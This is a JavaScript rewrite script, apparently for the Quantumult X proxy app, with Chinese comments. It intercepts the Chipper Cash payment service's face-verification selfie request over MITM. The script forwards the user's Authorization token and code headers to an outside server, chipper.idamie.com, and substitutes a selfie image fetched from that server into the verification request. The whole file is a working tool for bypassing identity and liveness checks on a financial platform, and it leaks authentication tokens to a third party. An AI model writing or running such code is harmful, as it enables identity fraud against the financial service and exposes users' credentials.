/*
[Script]
# 替换 selfie 的请求体
^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-response-body https://raw.githubusercontent.com/chucyfunny/chippertest/main/face.js

[MITM]
hostname = compliance.chippercash.com
*/

const url = 'https://chipper.idamie.com/api/v1/upload/selfie_image';

// 获取响应体和请求头信息
const request = $request;
const body = JSON.parse(request.body || '{}');
const token = request.headers['Authorization'] || '';
const code = request.headers['code'] || '';

if (!token || !code) {
  // 如果缺少 token 或 code，发送通知并结束
  $notify('Error', 'Missing token or code', 'Authorization or code header not found.');
  $done({});  // 放行请求
} else {
  // 准备发送到服务器的 POST 请求
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': token,
    'code': code
  };

  const options = {
    url: url,
    method: "POST",
    headers: headers,
    body: JSON.stringify({})
  };

  // 发送 POST 请求到服务器以获取 selfie 替换数据
  $task.fetch(options).then(response => {
    try {
      const jsonData = JSON.parse(response.body);

      if (jsonData.data) {
        // 获取服务器返回的 base64 编码的 selfie 数据
        const base64Data = jsonData.data;

        // 替换请求体中的 selfie 字段
        body.selfie = base64Data;

        // 返回修改后的响应体
        $done({body: JSON.stringify(body)});

      } else if (jsonData.error) {
        // 如果服务器返回错误信息，通知用户
        $notify('Error', 'Server Error', jsonData.error);
        $done({});
      } else {
        $notify('Unexpected Response', 'The server response did not contain expected data.', '');
        $done({});
      }
    } catch (e) {
      // 处理 JSON 解析错误
      $notify('Response Error', 'Failed to parse the server response', e.message);
      $done({});
    }
  }, reason => {
    // 处理请求发送错误
    $notify('Request Error', 'Failed to send request to server', reason.error);
    $done({});
  });
}
